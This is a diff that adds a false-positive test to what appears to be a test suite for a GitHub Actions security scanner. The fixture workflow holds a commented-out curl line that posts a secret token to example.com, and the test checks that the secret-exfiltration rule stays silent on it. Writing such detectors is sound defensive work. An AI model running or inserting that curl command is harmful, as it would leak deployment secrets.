@@ -101,6 +101,22 @@ describe("v5.18 rule precision", () => {
       expect(f?.line).toBe(11);
     });
 
+    it("FALSE POSITIVE: a commented-out curl in a step that holds a secret", () => {
+      writeWorkflow(tempDir, "commented.yml", [
+        "on: push",
+        "jobs:",
+        "  build:",
+        "    steps:",
+        "      - env:",
+        "          TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+        "        run: |",
+        "          # curl -d \"$TOKEN\" https://example.com  (disabled)",
+        '          echo "$TOKEN" > /dev/null',
+      ]);
+      const findings = scanGitHubActionsWorkflows(tempDir);
+      expect(findings.some((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")).toBe(false);
+    });
+
     it("FALSE POSITIVE: a step that only runs `git fetch` with a secret in scope", () => {
       writeWorkflow(tempDir, "sync.yml", [
         "on: push",
